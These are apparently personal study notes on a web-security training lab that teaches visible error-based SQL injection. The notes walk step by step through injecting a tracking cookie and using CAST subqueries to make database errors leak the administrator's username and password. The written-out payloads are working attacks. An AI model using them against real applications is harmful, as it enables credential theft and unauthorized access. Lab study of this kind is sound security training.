# Visible error-based SQL injection
- Extracting sensitive data via verbose SQL error messages
  - Misconfiguration of the database sometimes results in verbose error messages
  - can provide information that may be useful to an attacker
  - the following error message, which occurs after injecting a single quote into an id paramete
  ```
  Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
  ```
  - This shows the full query that the application constructed using our input
  - we can see the context that we're injecting into
  - that is, a single-quoted string inside a WHERE statement. This makes it easier to construct a valid query containing a malicious payload
  - we can see that commenting out the rest of the query would prevent the superfluous single-quote from breaking the syntax
  - may be able to induce the application to generate an error message that contains some of the data that is returned by the query
  - effectively turns an otherwise blind SQL injection vulnerability into a "visible" one
  - One way of achieving this is to use the CAST() function, which enables you to convert one data type to another
  - a query containing the following statement
  ```
  CAST((SELECT example_column FROM example_table) AS int)
  ```
  - Often, the data that you're trying to read is a string
  - Attempting to convert this to an incompatible data type, such as an int, may cause an error similar to the following
  ```
  ERROR: invalid input syntax for type integer: "Example data"
  ```
  - may also be useful in cases where you're unable to trigger conditional responses because of a character limit imposed on the query.
# Lab
- SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie
- The results of the SQL query are not returned
- database contains a different table called users, with columns called username and password
# Goal
- leak the password for the administrator
- Log in via Administrator
# Solving The lab  
- Go to the Proxy > HTTP history tab and find a GET / request that contains a TrackingId cookie
- In Repeater, append a single quote to the value of your TrackingId cookie and send the request
```
TrackingId=qSEbpYZoqw3E7ooB'
```
- notice the verbose error message. This discloses the full SQL query, including the value of your cookie
- In the request, add comment characters to comment out the rest of the query, including the extra single-quote character that's causing the error
```
TrackingId=qSEbpYZoqw3E7ooB'--;
```
- no longer receive an error. This suggests that the query is now syntactically valid
- Adapt the query to include a generic SELECT subquery and cast the returned value to an int data type
```
TrackingId=qSEbpYZoqw3E7ooB' AND CAST((SELECT 1) AS int)--
```
- different error saying that an AND condition must be a boolean expression
- can simply add a comparison operator (=) as follows
```
TrackingId=qSEbpYZoqw3E7ooB' AND 1=CAST((SELECT 1) AS int)--
```
- no longer receive an error. This suggests that this is a valid query again
- Adapt the SELECT statement so that it retrieves usernames from the database
```
TrackingId=qSEbpYZoqw3E7ooB' AND 1=CAST((SELECT username FROM users) AS int)--
```
- now we receive the initial error message again.  query now appears to be truncated due to a character limit. As a result, the comment characters added to fix up the query aren't included
- Delete the original value of the TrackingId cookie to free up some additional characters
```
TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
```
- new error message, which appears to be generated by the database. This suggests that the query was run properly, but  still getting an error because it unexpectedly returned more than one row
```
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```
- the error message now leaks the first username from the users table
```
ERROR: invalid input syntax for type integer: "administrator"
```
- now modify the query once again to leak their password
```
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```
- and we got the password and solved the lab by logging in

